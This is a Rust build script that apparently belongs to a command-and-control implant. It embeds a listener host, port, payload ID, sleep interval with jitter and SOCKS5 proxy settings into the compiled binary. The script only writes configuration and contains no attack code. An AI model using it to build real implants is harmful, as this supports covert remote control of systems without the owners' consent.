use std::env;
use std::fs;
use std::path::Path;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=config.json");
    println!("cargo:rerun-if-env-changed=LISTENER_HOST");
    println!("cargo:rerun-if-env-changed=LISTENER_PORT");
    println!("cargo:rerun-if-env-changed=SLEEP_INTERVAL");
    println!("cargo:rerun-if-env-changed=PAYLOAD_ID");
    println!("cargo:rerun-if-env-changed=PROTOCOL");
    println!("cargo:rerun-if-env-changed=SOCKS5_ENABLED");
    println!("cargo:rerun-if-env-changed=SOCKS5_PORT");

    // Get configuration from environment variables
    let server_host = env::var("LISTENER_HOST").unwrap_or_default();
    let server_port = env::var("LISTENER_PORT").unwrap_or_default();
    let sleep_interval = env::var("SLEEP_INTERVAL").unwrap_or_else(|_| "60".to_string());
    let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
    let socks5_enabled = env::var("SOCKS5_ENABLED")
        .unwrap_or_else(|_| "true".to_string())
        .parse::<bool>()
        .unwrap_or(true);
    let socks5_port = env::var("SOCKS5_PORT").unwrap_or_else(|_| "9050".to_string());
    
    let default_protocol = if server_port == "443" {
        "https"
    } else {
        "http"
    };
    
    let protocol = env::var("PROTOCOL").unwrap_or_else(|_| default_protocol.to_string());

    // Only use environment config if we have all required values
    let config_content = if !server_host.is_empty() && !server_port.is_empty() && !payload_id.is_empty() {
        format!(
            r#"{{
                "server_url": "{}:{}",
                "sleep_interval": {},
                "jitter": 2,
                "payload_id": "{}",
                "protocol": "{}",
                "socks5_enabled": {},
                "socks5_port": {}
            }}"#,
            server_host, server_port, sleep_interval, payload_id, protocol,
            socks5_enabled, socks5_port
        )
    } else if let Ok(content) = fs::read_to_string("config.json") {
        // If we have a config.json file, use it as fallback
        content
    } else {
        // Empty config that will force error at runtime
        r#"{
            "server_url": "",
            "sleep_interval": 5,
            "jitter": 2,
            "payload_id": "",
            "protocol": "http",
            "socks5_enabled": true,
            "socks5_port": 9050
        }"#.to_string()
    };

    // Generate Rust code with the embedded config
    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("config.rs");
    
    // Create the config code with proper raw string nesting 
    let config_code = format!(
        r###"pub const EMBEDDED_CONFIG: &str = r#"{}"#;"###,
        config_content
    );

    fs::write(dest_path, config_code).unwrap();
}